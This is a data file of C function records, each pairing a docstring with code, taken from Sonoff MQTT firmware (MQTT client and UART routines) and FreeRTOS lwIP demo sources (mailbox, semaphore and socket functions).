{"docstring": "/**\n  * @brief  MQTT publish function.\n  * @param  client:   MQTT_Client reference\n  * @param  topic:    string topic will publish to\n  * @param  data:     buffer data send point to\n  * @param  data_length: length of data\n  * @param  qos:    qos\n  * @param  retain:   retain\n  * @retval TRUE if success queue\n  */\n", "func_signal": "BOOL ICACHE_FLASH_ATTR\nMQTT_Publish(MQTT_Client *client, const char* topic, const char* data, int data_length, int qos, int retain)", "code": "{\n  uint8_t dataBuffer[MQTT_BUF_SIZE];\n  uint16_t dataLen;\n  client->mqtt_state.outbound_message = mqtt_msg_publish(&client->mqtt_state.mqtt_connection,\n                                        topic, data, data_length,\n                                        qos, retain,\n                                        &client->mqtt_state.pending_msg_id);\n  if (client->mqtt_state.outbound_message->length == 0) {\n    INFO(\"MQTT: Queuing publish failed\\r\\n\");\n    return FALSE;\n  }\n  INFO(\"MQTT: queuing publish, length: %d, queue size(%d/%d)\\r\\n\", client->mqtt_state.outbound_message->length, client->msgQueue.rb.fill_cnt, client->msgQueue.rb.size);\n  while (QUEUE_Puts(&client->msgQueue, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length) == -1) {\n    INFO(\"MQTT: Queue full\\r\\n\");\n    if (QUEUE_Gets(&client->msgQueue, dataBuffer, &dataLen, MQTT_BUF_SIZE) == -1) {\n      INFO(\"MQTT: Serious buffer error\\r\\n\");\n      return FALSE;\n    }\n  }\n  system_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n  return TRUE;\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/******************************************************************************\n * FunctionName : uart1_tx_one_char\n * Description  : Internal used function\n *                Use uart1 interface to transfer one char\n * Parameters   : uint8 TxChar - character to tx\n * Returns      : OK\n*******************************************************************************/\n", "func_signal": "LOCAL STATUS\nuart_tx_one_char(uint8 uart, uint8 TxChar)", "code": "{\n    while (true)\n    {\n      uint32 fifo_cnt = READ_PERI_REG(UART_STATUS(uart)) & (UART_TXFIFO_CNT<<UART_TXFIFO_CNT_S);\n      if ((fifo_cnt >> UART_TXFIFO_CNT_S & UART_TXFIFO_CNT) < 126) {\n        break;\n      }\n    }\n\n    WRITE_PERI_REG(UART_FIFO(uart) , TxChar);\n    return OK;\n}", "path": "sonoff\\modules\\uart.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/**\n  * @brief  MQTT initialization mqtt client function\n  * @param  client:   MQTT_Client reference\n  * @param  clientid:   MQTT client id\n  * @param  client_user:MQTT client user\n  * @param  client_pass:MQTT client password\n  * @param  client_pass:MQTT keep alive timer, in second\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nMQTT_InitClient(MQTT_Client *mqttClient, uint8_t* client_id, uint8_t* client_user, uint8_t* client_pass, uint32_t keepAliveTime, uint8_t cleanSession)", "code": "{\n  uint32_t temp;\n  INFO(\"MQTT_InitClient\\r\\n\");\n\n  os_memset(&mqttClient->connect_info, 0, sizeof(mqtt_connect_info_t));\n\n  temp = os_strlen(client_id);\n  mqttClient->connect_info.client_id = (uint8_t*)os_zalloc(temp + 1);\n  os_strcpy(mqttClient->connect_info.client_id, client_id);\n  mqttClient->connect_info.client_id[temp] = 0;\n\n  temp = os_strlen(client_user);\n  mqttClient->connect_info.username = (uint8_t*)os_zalloc(temp + 1);\n  os_strcpy(mqttClient->connect_info.username, client_user);\n  mqttClient->connect_info.username[temp] = 0;\n\n  temp = os_strlen(client_pass);\n  mqttClient->connect_info.password = (uint8_t*)os_zalloc(temp + 1);\n  os_strcpy(mqttClient->connect_info.password, client_pass);\n  mqttClient->connect_info.password[temp] = 0;\n\n\n  mqttClient->connect_info.keepalive = keepAliveTime;\n  mqttClient->connect_info.clean_session = cleanSession;\n\n  mqttClient->mqtt_state.in_buffer = (uint8_t *)os_zalloc(MQTT_BUF_SIZE);\n  mqttClient->mqtt_state.in_buffer_length = MQTT_BUF_SIZE;\n  mqttClient->mqtt_state.out_buffer =  (uint8_t *)os_zalloc(MQTT_BUF_SIZE);\n  mqttClient->mqtt_state.out_buffer_length = MQTT_BUF_SIZE;\n  mqttClient->mqtt_state.connect_info = &mqttClient->connect_info;\n\n  mqtt_msg_init(&mqttClient->mqtt_state.mqtt_connection, mqttClient->mqtt_state.out_buffer, mqttClient->mqtt_state.out_buffer_length);\n\n  QUEUE_Init(&mqttClient->msgQueue, QUEUE_BUFFER_SIZE);\n\n  system_os_task(MQTT_Task, MQTT_TASK_PRIO, mqtt_procTaskQueue, MQTT_TASK_QUEUE_SIZE);\n  system_os_post(MQTT_TASK_PRIO, 0, (os_param_t)mqttClient);\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/******************************************************************************\n * FunctionName : uart_config\n * Description  : Internal used function\n *                UART0 used for data TX/RX, RX buffer size is 0x100, interrupt enabled\n *                UART1 just used for debug output\n * Parameters   : uart_no, use UART0 or UART1 defined ahead\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuart_config(uint8 uart_no)", "code": "{\n  if (uart_no == UART1)\n  {\n    PIN_FUNC_SELECT(PERIPHS_IO_MUX_GPIO2_U, FUNC_U1TXD_BK);\n  }\n  else\n  {\n    /* rcv_buff size if 0x100 */\n    ETS_UART_INTR_ATTACH(uart0_rx_intr_handler,  &(UartDev.rcv_buff));\n    PIN_PULLUP_DIS(PERIPHS_IO_MUX_U0TXD_U);\n    PIN_FUNC_SELECT(PERIPHS_IO_MUX_U0TXD_U, FUNC_U0TXD);\n    PIN_FUNC_SELECT(PERIPHS_IO_MUX_MTDO_U, FUNC_U0RTS);\n  }\n\n  uart_div_modify(uart_no, UART_CLK_FREQ / (UartDev.baut_rate));\n\n  WRITE_PERI_REG(UART_CONF0(uart_no), UartDev.exist_parity\n                 | UartDev.parity\n                 | (UartDev.stop_bits << UART_STOP_BIT_NUM_S)\n                 | (UartDev.data_bits << UART_BIT_NUM_S));\n\n  //clear rx and tx fifo,not ready\n  SET_PERI_REG_MASK(UART_CONF0(uart_no), UART_RXFIFO_RST | UART_TXFIFO_RST);\n  CLEAR_PERI_REG_MASK(UART_CONF0(uart_no), UART_RXFIFO_RST | UART_TXFIFO_RST);\n\n  //set rx fifo trigger\n//  WRITE_PERI_REG(UART_CONF1(uart_no),\n//                 ((UartDev.rcv_buff.TrigLvl & UART_RXFIFO_FULL_THRHD) << UART_RXFIFO_FULL_THRHD_S) |\n//                 ((96 & UART_TXFIFO_EMPTY_THRHD) << UART_TXFIFO_EMPTY_THRHD_S) |\n//                 UART_RX_FLOW_EN);\n  if (uart_no == UART0)\n  {\n    //set rx fifo trigger\n    WRITE_PERI_REG(UART_CONF1(uart_no),\n                   ((0x10 & UART_RXFIFO_FULL_THRHD) << UART_RXFIFO_FULL_THRHD_S) |\n                   ((0x10 & UART_RX_FLOW_THRHD) << UART_RX_FLOW_THRHD_S) |\n                   UART_RX_FLOW_EN |\n                   (0x02 & UART_RX_TOUT_THRHD) << UART_RX_TOUT_THRHD_S |\n                   UART_RX_TOUT_EN);\n    SET_PERI_REG_MASK(UART_INT_ENA(uart_no), UART_RXFIFO_TOUT_INT_ENA |\n                      UART_FRM_ERR_INT_ENA);\n  }\n  else\n  {\n    WRITE_PERI_REG(UART_CONF1(uart_no),\n                   ((UartDev.rcv_buff.TrigLvl & UART_RXFIFO_FULL_THRHD) << UART_RXFIFO_FULL_THRHD_S));\n  }\n\n  //clear all interrupt\n  WRITE_PERI_REG(UART_INT_CLR(uart_no), 0xffff);\n  //enable rx_interrupt\n  SET_PERI_REG_MASK(UART_INT_ENA(uart_no), UART_RXFIFO_FULL_INT_ENA);\n}", "path": "sonoff\\modules\\uart.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/**\n  * @brief  Delete MQTT client and free all memory\n  * @param  mqttClient: The mqtt client\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmqtt_client_delete(MQTT_Client *mqttClient)", "code": "{\n  mqtt_tcpclient_delete(mqttClient);\n  if (mqttClient->host != NULL) {\n    os_free(mqttClient->host);\n    mqttClient->host = NULL;\n  }\n\n  if (mqttClient->user_data != NULL) {\n    os_free(mqttClient->user_data);\n    mqttClient->user_data = NULL;\n  }\n\n  if(mqttClient->connect_info.client_id != NULL) {\n    os_free(mqttClient->connect_info.client_id);\n    mqttClient->connect_info.client_id = NULL;\n  }\n\n  if(mqttClient->connect_info.username != NULL) {\n    os_free(mqttClient->connect_info.username);\n    mqttClient->connect_info.username = NULL;\n  }\n\n  if(mqttClient->connect_info.password != NULL) {\n    os_free(mqttClient->connect_info.password);\n    mqttClient->connect_info.password = NULL;\n  }\n\n  if(mqttClient->connect_info.will_topic != NULL) {\n    os_free(mqttClient->connect_info.will_topic);\n    mqttClient->connect_info.will_topic = NULL;\n  }\n\n  if(mqttClient->connect_info.will_message != NULL) {\n    os_free(mqttClient->connect_info.will_message);\n    mqttClient->connect_info.will_message = NULL;\n  }\n\n  if(mqttClient->mqtt_state.in_buffer != NULL) {\n    os_free(mqttClient->mqtt_state.in_buffer);\n    mqttClient->mqtt_state.in_buffer = NULL;\n  }\n\n  if(mqttClient->mqtt_state.out_buffer != NULL) {\n    os_free(mqttClient->mqtt_state.out_buffer);\n    mqttClient->mqtt_state.out_buffer = NULL;\n  }\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/*---------------------------------------------------------------------------*\n * Routine:  sys_mbox_new\n *---------------------------------------------------------------------------*\n * Description:\n *      Creates a new mailbox\n * Inputs:\n *      int size                -- Size of elements in the mailbox\n * Outputs:\n *      sys_mbox_t              -- Handle to new mailbox\n *---------------------------------------------------------------------------*/\n", "func_signal": "err_t sys_mbox_new( sys_mbox_t *pxMailBox, int iSize )", "code": "{\nerr_t xReturn = ERR_MEM;\n\n\t*pxMailBox = xQueueCreate( iSize, sizeof( void * ) );\n\n\tif( *pxMailBox != NULL )\n\t{\n\t\txReturn = ERR_OK;\n\t\tSYS_STATS_INC_USED( mbox );\n\t}\n\n\treturn xReturn;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwip-1.4.0\\ports\\win32\\sys_arch.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/**\n * Set a socket into listen mode.\n * The socket may not have been used for another connection previously.\n *\n * @param s the socket to set to listening mode\n * @param backlog (ATTENTION: need TCP_LISTEN_BACKLOG=1)\n * @return 0 on success, non-zero on failure\n */\n", "func_signal": "int\nlwip_listen(int s, int backlog)", "code": "{\n  struct lwip_socket *sock;\n  err_t err;\n\n  LWIP_DEBUGF(SOCKETS_DEBUG, (\"lwip_listen(%d, backlog=%d)\\n\", s, backlog));\n\n  sock = get_socket(s);\n  if (!sock)\n    return -1;\n\n  /* limit the \"backlog\" parameter to fit in an u8_t */\n  if (backlog < 0) {\n    backlog = 0;\n  }\n  if (backlog > 0xff) {\n    backlog = 0xff;\n  }\n\n  err = netconn_listen_with_backlog(sock->conn, backlog);\n\n  if (err != ERR_OK) {\n    LWIP_DEBUGF(SOCKETS_DEBUG, (\"lwip_listen(%d) failed, err=%d\\n\", s, err));\n    sock_set_errno(sock, err_to_errno(err));\n    return -1;\n  }\n\n  sock_set_errno(sock, 0);\n  return 0;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwIP_132\\src\\api\\sockets.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/*---------------------------------------------------------------------------*\n * Routine:  sys_mbox_trypost\n *---------------------------------------------------------------------------*\n * Description:\n *      Try to post the \"msg\" to the mailbox.  Returns immediately with\n *      error if cannot.\n * Inputs:\n *      sys_mbox_t mbox         -- Handle of mailbox\n *      void *msg               -- Pointer to data to post\n * Outputs:\n *      err_t                   -- ERR_OK if message posted, else ERR_MEM\n *                                  if not.\n *---------------------------------------------------------------------------*/\n", "func_signal": "err_t sys_mbox_trypost( sys_mbox_t *pxMailBox, void *pxMessageToPost )", "code": "{\nerr_t xReturn;\n\n\tif( xQueueSend( *pxMailBox, &pxMessageToPost, 0UL ) == pdPASS )\n\t{\n\t\txReturn = ERR_OK;\n\t}\n\telse\n\t{\n\t\t/* The queue was already full. */\n\t\txReturn = ERR_MEM;\n\t\tSYS_STATS_INC( mbox.err );\n\t}\n\n\treturn xReturn;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwip-1.4.0\\ports\\win32\\sys_arch.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "int main( void )", "code": "{\n\t/* Configure the hardware ready to run the demo. */\n\tprvSetupHardware();\n\n\t/* The mainCREATE_SIMPLE_BLINKY_DEMO_ONLY setting is described at the top\n\tof this file. */\n\t#if( mainCREATE_SIMPLE_BLINKY_DEMO_ONLY == 1 )\n\t{\n\t\tmain_blinky();\n\t}\n\t#else\n\t{\n\t\tmain_full();\n\t}\n\t#endif\n\n\treturn 0;\n}", "path": "FreeRTOS\\Demo\\CORTEX_M7_SAMV71_Xplained_AtmelStudio\\main.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/*---------------------------------------------------------------------------*\n * Routine:  sys_sem_free\n *---------------------------------------------------------------------------*\n * Description:\n *      Deallocates a semaphore\n * Inputs:\n *      sys_sem_t sem           -- Semaphore to free\n *---------------------------------------------------------------------------*/\n", "func_signal": "void sys_sem_free( sys_sem_t *pxSemaphore )", "code": "{\n\tSYS_STATS_DEC(sem.used);\n\tvQueueDelete( *pxSemaphore );\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwip-1.4.0\\ports\\win32\\sys_arch.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vApplicationStackOverflowHook( TaskHandle_t pxTask, char *pcTaskName )", "code": "{\n\t( void ) pcTaskName;\n\t( void ) pxTask;\n\n\t/* Run time stack overflow checking is performed if\n\tconfigCHECK_FOR_STACK_OVERFLOW is defined to 1 or 2.  This hook\n\tfunction is called if a stack overflow is detected. */\n\n\t/* Force an assert. */\n\tconfigASSERT( ( volatile void * ) NULL );\n}", "path": "FreeRTOS\\Demo\\CORTEX_M7_SAMV71_Xplained_AtmelStudio\\main.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/**\n * Callback registered in the netconn layer for each socket-netconn.\n * Processes recvevent (data available) and wakes up tasks waiting for select.\n */\n", "func_signal": "static void\nevent_callback(struct netconn *conn, enum netconn_evt evt, u16_t len)", "code": "{\n  int s;\n  struct lwip_socket *sock;\n  struct lwip_select_cb *scb;\n\n  LWIP_UNUSED_ARG(len);\n\n  /* Get socket */\n  if (conn) {\n    s = conn->socket;\n    if (s < 0) {\n      /* Data comes in right away after an accept, even though\n       * the server task might not have created a new socket yet.\n       * Just count down (or up) if that's the case and we\n       * will use the data later. Note that only receive events\n       * can happen before the new socket is set up. */\n      sys_sem_wait(socksem);\n      if (conn->socket < 0) {\n        if (evt == NETCONN_EVT_RCVPLUS) {\n          conn->socket--;\n        }\n        sys_sem_signal(socksem);\n        return;\n      }\n      s = conn->socket;\n      sys_sem_signal(socksem);\n    }\n\n    sock = get_socket(s);\n    if (!sock) {\n      return;\n    }\n  } else {\n    return;\n  }\n\n  sys_sem_wait(selectsem);\n  /* Set event as required */\n  switch (evt) {\n    case NETCONN_EVT_RCVPLUS:\n      sock->rcvevent++;\n      break;\n    case NETCONN_EVT_RCVMINUS:\n      sock->rcvevent--;\n      break;\n    case NETCONN_EVT_SENDPLUS:\n      sock->sendevent = 1;\n      break;\n    case NETCONN_EVT_SENDMINUS:\n      sock->sendevent = 0;\n      break;\n    default:\n      LWIP_ASSERT(\"unknown event\", 0);\n      break;\n  }\n  sys_sem_signal(selectsem);\n\n  /* Now decide if anyone is waiting for this socket */\n  /* NOTE: This code is written this way to protect the select link list\n     but to avoid a deadlock situation by releasing socksem before\n     signalling for the select. This means we need to go through the list\n     multiple times ONLY IF a select was actually waiting. We go through\n     the list the number of waiting select calls + 1. This list is\n     expected to be small. */\n  while (1) {\n    sys_sem_wait(selectsem);\n    for (scb = select_cb_list; scb; scb = scb->next) {\n      if (scb->sem_signalled == 0) {\n        /* Test this select call for our socket */\n        if (scb->readset && FD_ISSET(s, scb->readset))\n          if (sock->rcvevent > 0)\n            break;\n        if (scb->writeset && FD_ISSET(s, scb->writeset))\n          if (sock->sendevent)\n            break;\n      }\n    }\n    if (scb) {\n      scb->sem_signalled = 1;\n      sys_sem_signal(scb->sem);\n      sys_sem_signal(selectsem);\n    } else {\n      sys_sem_signal(selectsem);\n      break;\n    }\n  }\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwIP_132\\src\\api\\sockets.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/*---------------------------------------------------------------------------*\n * Routine:  sys_arch_mbox_tryfetch\n *---------------------------------------------------------------------------*\n * Description:\n *      Similar to sys_arch_mbox_fetch, but if message is not ready\n *      immediately, we'll return with SYS_MBOX_EMPTY.  On success, 0 is\n *      returned.\n * Inputs:\n *      sys_mbox_t mbox         -- Handle of mailbox\n *      void **msg              -- Pointer to pointer to msg received\n * Outputs:\n *      u32_t                   -- SYS_MBOX_EMPTY if no messages.  Otherwise,\n *                                  return ERR_OK.\n *---------------------------------------------------------------------------*/\n", "func_signal": "u32_t sys_arch_mbox_tryfetch( sys_mbox_t *pxMailBox, void **ppvBuffer )", "code": "{\nvoid *pvDummy;\nunsigned long ulReturn;\n\n\tif( ppvBuffer== NULL )\n\t{\n\t\tppvBuffer = &pvDummy;\n\t}\n\n\tif( pdTRUE == xQueueReceive( *pxMailBox, &( *ppvBuffer ), 0UL ) )\n\t{\n\t\tulReturn = ERR_OK;\n\t}\n\telse\n\t{\n\t\tulReturn = SYS_MBOX_EMPTY;\n\t}\n\n\treturn ulReturn;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwip-1.4.0\\ports\\win32\\sys_arch.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vApplicationTickHook( void )", "code": "{\n\t#if mainCREATE_SIMPLE_BLINKY_DEMO_ONLY == 0\n\t{\n\t\t/* The full demo includes a software timer demo/test that requires\n\t\tprodding periodically from the tick interrupt. */\n\t\tvTimerPeriodicISRTests();\n\n\t\t/* Call the periodic queue overwrite from ISR demo. */\n\t\tvQueueOverwritePeriodicISRDemo();\n\n\t\t/* Call the periodic event group from ISR demo. */\n\t\tvPeriodicEventGroupsProcessing();\n\n\t\t/* Call the code that uses a mutex from an ISR. */\n\t\tvInterruptSemaphorePeriodicTest();\n\n\t\t/* Call the code that 'gives' a task notification from an ISR. */\n\t\txNotifyTaskFromISR();\n\t}\n\t#endif\n}", "path": "FreeRTOS\\Demo\\CORTEX_M7_SAMV71_Xplained_AtmelStudio\\main.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/**\n * Allocate a new socket for a given netconn.\n *\n * @param newconn the netconn for which to allocate a socket\n * @return the index of the new socket; -1 on error\n */\n", "func_signal": "static int\nalloc_socket(struct netconn *newconn)", "code": "{\n  int i;\n\n  /* Protect socket array */\n  sys_sem_wait(socksem);\n\n  /* allocate a new socket identifier */\n  for (i = 0; i < NUM_SOCKETS; ++i) {\n    if (!sockets[i].conn) {\n      sockets[i].conn       = newconn;\n      sockets[i].lastdata   = NULL;\n      sockets[i].lastoffset = 0;\n      sockets[i].rcvevent   = 0;\n      sockets[i].sendevent  = 1; /* TCP send buf is empty */\n      sockets[i].flags      = 0;\n      sockets[i].err        = 0;\n      sys_sem_signal(socksem);\n      return i;\n    }\n  }\n  sys_sem_signal(socksem);\n  return -1;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwIP_132\\src\\api\\sockets.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/**\n * Map a externally used socket index to the internal socket representation.\n *\n * @param s externally used socket index\n * @return struct lwip_socket for the socket or NULL if not found\n */\n", "func_signal": "static struct lwip_socket *\nget_socket(int s)", "code": "{\n  struct lwip_socket *sock;\n\n  if ((s < 0) || (s >= NUM_SOCKETS)) {\n    LWIP_DEBUGF(SOCKETS_DEBUG, (\"get_socket(%d): invalid\\n\", s));\n    set_errno(EBADF);\n    return NULL;\n  }\n\n  sock = &sockets[s];\n\n  if (!sock->conn) {\n    LWIP_DEBUGF(SOCKETS_DEBUG, (\"get_socket(%d): not active\\n\", s));\n    set_errno(EBADF);\n    return NULL;\n  }\n\n  return sock;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwIP_132\\src\\api\\sockets.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/*---------------------------------------------------------------------------*\n * Routine:  sys_arch_unprotect\n *---------------------------------------------------------------------------*\n * Description:\n *      This optional function does a \"fast\" set of critical region\n *      protection to the value specified by pval. See the documentation for\n *      sys_arch_protect() for more information. This function is only\n *      required if your port is supporting an operating system.\n * Inputs:\n *      sys_prot_t              -- Previous protection level (not used here)\n *---------------------------------------------------------------------------*/\n", "func_signal": "void sys_arch_unprotect( sys_prot_t xValue )", "code": "{\n\t(void) xValue;\n\ttaskEXIT_CRITICAL();\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwip-1.4.0\\ports\\win32\\sys_arch.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/*---------------------------------------------------------------------------*\n * Routine:  sys_sem_new\n *---------------------------------------------------------------------------*\n * Description:\n *      Creates and returns a new semaphore. The \"ucCount\" argument specifies\n *      the initial state of the semaphore.\n *      NOTE: Currently this routine only creates counts of 1 or 0\n * Inputs:\n *      sys_mbox_t mbox         -- Handle of mailbox\n *      u8_t ucCount              -- Initial ucCount of semaphore (1 or 0)\n * Outputs:\n *      sys_sem_t               -- Created semaphore or 0 if could not create.\n *---------------------------------------------------------------------------*/\n", "func_signal": "err_t sys_sem_new( sys_sem_t *pxSemaphore, u8_t ucCount )", "code": "{\nerr_t xReturn = ERR_MEM;\n\n\tvSemaphoreCreateBinary( ( *pxSemaphore ) );\n\n\tif( *pxSemaphore != NULL )\n\t{\n\t\tif( ucCount == 0U )\n\t\t{\n\t\t\txSemaphoreTake( *pxSemaphore, 1UL );\n\t\t}\n\n\t\txReturn = ERR_OK;\n\t\tSYS_STATS_INC_USED( sem );\n\t}\n\telse\n\t{\n\t\tSYS_STATS_INC( sem.err );\n\t}\n\n\treturn xReturn;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwip-1.4.0\\ports\\win32\\sys_arch.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static void prvSetupHardware( void )", "code": "{\n\t/* Disable watchdog. */\n\tWDT_Disable( WDT );\n\tWDT_Disable( ( Wdt * ) RSWDT );\n\n\tSCB_EnableICache();\n\tSCB_EnableDCache();\n\n    LED_Configure( 0 );\n    LED_Configure( 1 );\n}", "path": "FreeRTOS\\Demo\\CORTEX_M7_SAMV71_Xplained_AtmelStudio\\main.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/**\n * Unimplemented: Close one end of a full-duplex connection.\n * Currently, the full connection is closed.\n */\n", "func_signal": "int\nlwip_shutdown(int s, int how)", "code": "{\n  LWIP_UNUSED_ARG(how);\n  LWIP_DEBUGF(SOCKETS_DEBUG, (\"lwip_shutdown(%d, how=%d)\\n\", s, how));\n  return lwip_close(s); /* XXX temporary hack until proper implementation */\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwIP_132\\src\\api\\sockets.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/*---------------------------------------------------------------------------*\n * Routine:  sys_mbox_free\n *---------------------------------------------------------------------------*\n * Description:\n *      Deallocates a mailbox. If there are messages still present in the\n *      mailbox when the mailbox is deallocated, it is an indication of a\n *      programming error in lwIP and the developer should be notified.\n * Inputs:\n *      sys_mbox_t mbox         -- Handle of mailbox\n * Outputs:\n *      sys_mbox_t              -- Handle to new mailbox\n *---------------------------------------------------------------------------*/\n", "func_signal": "void sys_mbox_free( sys_mbox_t *pxMailBox )", "code": "{\nunsigned long ulMessagesWaiting;\n\n\tulMessagesWaiting = uxQueueMessagesWaiting( *pxMailBox );\n\tconfigASSERT( ( ulMessagesWaiting == 0 ) );\n\n\t#if SYS_STATS\n\t{\n\t\tif( ulMessagesWaiting != 0UL )\n\t\t{\n\t\t\tSYS_STATS_INC( mbox.err );\n\t\t}\n\n\t\tSYS_STATS_DEC( mbox.used );\n\t}\n\t#endif /* SYS_STATS */\n\n\tvQueueDelete( *pxMailBox );\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwip-1.4.0\\ports\\win32\\sys_arch.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/* Below this, the well-known socket functions are implemented.\n * Use google.com or opengroup.org to get a good description :-)\n *\n * Exceptions are documented!\n */\n", "func_signal": "int\nlwip_accept(int s, struct sockaddr *addr, socklen_t *addrlen)", "code": "{\n  struct lwip_socket *sock, *nsock;\n  struct netconn *newconn;\n  struct ip_addr naddr;\n  u16_t port;\n  int newsock;\n  struct sockaddr_in sin;\n  err_t err;\n\n  LWIP_DEBUGF(SOCKETS_DEBUG, (\"lwip_accept(%d)...\\n\", s));\n  sock = get_socket(s);\n  if (!sock)\n    return -1;\n\n  if ((sock->flags & O_NONBLOCK) && (sock->rcvevent <= 0)) {\n    LWIP_DEBUGF(SOCKETS_DEBUG, (\"lwip_accept(%d): returning EWOULDBLOCK\\n\", s));\n    sock_set_errno(sock, EWOULDBLOCK);\n    return -1;\n  }\n\n  newconn = netconn_accept(sock->conn);\n  if (!newconn) {\n    LWIP_DEBUGF(SOCKETS_DEBUG, (\"lwip_accept(%d) failed, err=%d\\n\", s, sock->conn->err));\n    sock_set_errno(sock, err_to_errno(sock->conn->err));\n    return -1;\n  }\n\n  /* get the IP address and port of the remote host */\n  err = netconn_peer(newconn, &naddr, &port);\n  if (err != ERR_OK) {\n    netconn_delete(newconn);\n    sock_set_errno(sock, err_to_errno(err));\n    return -1;\n  }\n\n  /* Note that POSIX only requires us to check addr is non-NULL. addrlen must\n   * not be NULL if addr is valid.\n   */\n  if (NULL != addr) {\n    LWIP_ASSERT(\"addr valid but addrlen NULL\", addrlen != NULL);\n    memset(&sin, 0, sizeof(sin));\n    sin.sin_len = sizeof(sin);\n    sin.sin_family = AF_INET;\n    sin.sin_port = htons(port);\n    sin.sin_addr.s_addr = naddr.addr;\n\n    if (*addrlen > sizeof(sin))\n      *addrlen = sizeof(sin);\n\n    MEMCPY(addr, &sin, *addrlen);\n  }\n\n  newsock = alloc_socket(newconn);\n  if (newsock == -1) {\n    netconn_delete(newconn);\n    sock_set_errno(sock, ENFILE);\n    return -1;\n  }\n  LWIP_ASSERT(\"invalid socket index\", (newsock >= 0) && (newsock < NUM_SOCKETS));\n  newconn->callback = event_callback;\n  nsock = &sockets[newsock];\n  LWIP_ASSERT(\"invalid socket pointer\", nsock != NULL);\n\n  sys_sem_wait(socksem);\n  /* See event_callback: If data comes in right away after an accept, even\n   * though the server task might not have created a new socket yet.\n   * In that case, newconn->socket is counted down (newconn->socket--),\n   * so nsock->rcvevent is >= 1 here!\n   */\n  nsock->rcvevent += -1 - newconn->socket;\n  newconn->socket = newsock;\n  sys_sem_signal(socksem);\n\n  LWIP_DEBUGF(SOCKETS_DEBUG, (\"lwip_accept(%d) returning new sock=%d addr=\", s, newsock));\n  ip_addr_debug_print(SOCKETS_DEBUG, &naddr);\n  LWIP_DEBUGF(SOCKETS_DEBUG, (\" port=%\"U16_F\"\\n\", port));\n\n  sock_set_errno(sock, 0);\n  return newsock;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwIP_132\\src\\api\\sockets.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
